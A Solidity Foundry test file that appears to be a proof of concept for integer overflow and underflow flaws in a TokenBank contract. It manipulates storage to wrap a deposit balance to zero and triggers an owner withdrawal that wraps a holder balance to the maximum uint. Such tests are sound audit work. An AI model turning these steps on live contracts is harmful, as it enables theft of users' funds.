// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol";

contract TokenBankTest is Test {
    TokenBank public bank;
    address owner = makeAddr("owner");
    address holder = makeAddr("holder");
    address attacker = makeAddr("attacker");
    uint256 constant MIN_DEPOSIT = 1 ether;
    bytes32 constant HOLDERS_SLOT = bytes32(uint256(2));
    bytes32 constant MIN_DEPOSIT_SLOT = bytes32(uint256(1));

    function setUp() public {
        vm.prank(owner);
        bank = new TokenBank();
    }

    // Test Deposit overflow vulnerability
    function test_DepositOverflow() public {
        // Override MinDeposit to enable small-value overflow
        vm.store(address(bank), MIN_DEPOSIT_SLOT, bytes32(uint256(0)));
        
        // Set attacker's balance to max uint
        bytes32 attackerSlot = keccak256(abi.encode(attacker, HOLDERS_SLOT));
        vm.store(address(bank), attackerSlot, bytes32(type(uint256).max));
        
        // Get attacker balance before attack
        uint256 attackerBalanceBefore = bank.Holders(attacker);
        console.log("--- BEFORE-Trigger Deposit ---");
        console.log("Attacker balance:", attackerBalanceBefore);
        console.log("Vulnerability Exists: uint256 overflow potential present");
        
        // Fund attacker with 1 wei for the deposit
        vm.deal(attacker, 1);

        // Trigger critical action
        console.log("--- Trigger Deposit ---");
        vm.prank(attacker);
        bank.Deposit{value: 1}();
        
        // Get attacker balance after attack
        console.log("--- AFTER-Trigger Deposit ---");
        uint256 attackerBalanceAfter = bank.Holders(attacker);
        console.log("Attacker balance:", attackerBalanceAfter);
        
        // Verify overflow wrapped to 0
        assertEq(attackerBalanceAfter, 0, "Deposit overflow did not wrap to 0");
        console.log("Vulnerability Exists: Deposit overflow successfully wrapped balance to 0");
    }

    // Test WithdrawToHolder underflow vulnerability
    function test_WithdrawUnderflow() public {
        // Setup holder account with valid deposit
        uint256 depositAmount = MIN_DEPOSIT + 1;
        vm.deal(holder, depositAmount);
        vm.prank(holder);
        bank.Deposit{value: depositAmount}();
        
        // Verify successful deposit
        assertEq(bank.Holders(holder), depositAmount, "Initial deposit failed");
        
        // Get holder balance before attack
        uint256 holderBalanceBefore = bank.Holders(holder);
        console.log("--- BEFORE-Trigger WithdrawToHolder ---");
        console.log("Holder balance:", holderBalanceBefore);
        console.log("Vulnerability Exists: uint256 underflow potential present");
        
        // Calculate withdrawal amount that causes underflow
        uint256 withdrawAmount = bank.Holders(holder) + 1;
        
        // Ensure contract has sufficient balance for withdrawal
        vm.deal(address(bank), withdrawAmount);

        // Trigger critical action
        console.log("--- Trigger WithdrawToHolder ---");
        vm.prank(owner);
        bank.WithdrawToHolder(holder, withdrawAmount);
        
        // Get holder balance after attack
        console.log("--- AFTER-Trigger WithdrawToHolder ---");
        uint256 holderBalanceAfter = bank.Holders(holder);
        console.log("Holder balance:", holderBalanceAfter);
        
        // Verify underflow created max uint balance
        assertEq(
            holderBalanceAfter, 
            type(uint256).max,
            "Withdrawal underflow did not wrap to max"
        );
        console.log("Vulnerability Exists: Withdrawal underflow successfully wrapped balance to max uint");
    }
}